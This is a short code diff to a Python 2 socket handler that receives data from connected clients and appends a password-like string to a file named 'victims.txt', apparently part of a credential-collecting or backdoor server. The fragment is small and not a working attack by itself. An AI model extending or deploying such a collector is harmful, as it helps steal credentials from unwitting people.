@@ -14,10 +14,9 @@ def sendcode(c,ac):
     data = c.recv(2048)
     if not data:
         pass
-    if data == "P4SSW0RD":
+    if data == "P4SSW0RD:":
         file = open("victims.txt","a")
-        passwd = c.getpeername() + ": " + data
-        file.read(passwd)
+        file.write(data)
         file.close()
     else:
         print data
